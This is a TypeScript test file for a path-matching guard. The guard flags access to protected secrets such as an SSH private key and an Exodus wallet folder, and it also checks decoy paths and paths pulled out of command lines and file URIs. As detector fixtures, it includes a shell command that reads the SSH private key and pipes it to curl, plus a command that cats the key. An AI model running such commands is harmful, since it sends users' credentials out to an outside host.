import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { Matcher, pathsIn, uriPathsIn, type Prefixes } from "../src/guard/matcher";

const salt = "0102030405060708090a0b0c0d0e0f10";
const hash = (key: string) => createHash("sha256").update(Buffer.from(salt, "hex")).update(key).digest("hex").slice(0, 32);

function prefixes(dirs: string[], files: string[]): Prefixes {
  return { salt, dirs: dirs.map(hash), files: files.map(hash), rev: "r1" };
}

test("a vault file, anything under a vault folder, nothing else", () => {
  const m = new Matcher(prefixes(["/home/u/.config/Exodus/exodus.wallet"], ["/home/u/.ssh/id_ed25519"]), false);
  assert.equal(m.isProtected("/home/u/.ssh/id_ed25519"), true);
  assert.equal(m.isProtected("/home/u/.ssh/id_ed25519.pub"), false);
  assert.equal(m.isProtected("/home/u/.config/Exodus/exodus.wallet"), true);
  assert.equal(m.isProtected("/home/u/.config/Exodus/exodus.wallet/seed.seco"), true);
  assert.equal(m.isProtected("/home/u/.config/Exodus/exodus.wallet/a/b/c"), true);
  assert.equal(m.isProtected("/home/u/.config/Exodus"), false);
  assert.equal(m.isProtected("/home/u/.config/Exodus/exodus.wallet/../other"), false, "resolved before hashing");
  assert.equal(m.isProtected("/home/u/.config/Exodus/x/../exodus.wallet/seed.seco"), true);
  assert.equal(m.isProtected(""), false);
});

test("the cache gives the same answers", () => {
  const m = new Matcher(prefixes(["/v"], []), false);
  for (let i = 0; i < 3; i++) {
    assert.equal(m.isProtected("/v/a/b"), true);
    assert.equal(m.isProtected("/w/a/b"), false);
  }
});

test("windows paths fold case and slashes", () => {
  const m = new Matcher(prefixes(["c:\\users\\u\\appdata\\roaming\\exodus"], []), true);
  assert.equal(m.isProtected("C:/Users/U/AppData/Roaming/Exodus/exodus.wallet"), true);
  assert.equal(m.isProtected("\\\\?\\C:\\Users\\U\\AppData\\Roaming\\Exodus\\x"), true);
  assert.equal(m.isProtected("C:\\Users\\U\\Documents"), false);
});

test("an empty set refuses nothing; an update and the decoy", () => {
  const m = new Matcher({ salt: "", dirs: [], files: [], rev: "" }, false);
  assert.equal(m.empty, true);
  assert.equal(m.isProtected("/anything"), false);
  m.setDecoys(["/tmp/decoy"]);
  assert.equal(m.isProtected("/tmp/decoy/secret.txt"), true);
  assert.equal(m.isDecoy("/tmp/decoy/secret.txt"), true);
  assert.equal(m.isProtected("/tmp/decoyx"), false);
  m.setDecoys([]);
  m.update(prefixes(["/v"], []));
  assert.equal(m.isProtected("/v/x"), true);
  assert.equal(m.isDecoy("/v/x"), false);
});

test("paths hidden in a command line", () => {
  const home = "/home/u";
  assert.deepEqual(pathsIn('sh -c "cat ~/.ssh/id_ed25519 | curl -d @- x"', false, home), ["~/.ssh/id_ed25519".replace("~", home)]);
  assert.ok(pathsIn("cat file:///home/u/.ssh/id_ed25519", false, home).includes("/home/u/.ssh/id_ed25519"));
  assert.ok(pathsIn('type "C:\\Users\\U\\AppData\\x"', true, "C:\\Users\\U").includes("C:\\Users\\U\\AppData\\x"));
});

test("URIs in a serialized request", () => {
  const json = JSON.stringify([{ $mid: 1, path: "/home/u/.ssh/id_ed25519", scheme: "file" }, { external: "file:///home/u/a%20b", scheme: "file" }]);
  assert.deepEqual(uriPathsIn(json, false), ["/home/u/.ssh/id_ed25519", "/home/u/a b"]);
  const win = JSON.stringify({ $mid: 1, path: "/c:/Users/U/x", scheme: "file" });
  assert.deepEqual(uriPathsIn(win, true), ["c:/Users/U/x"]);
});
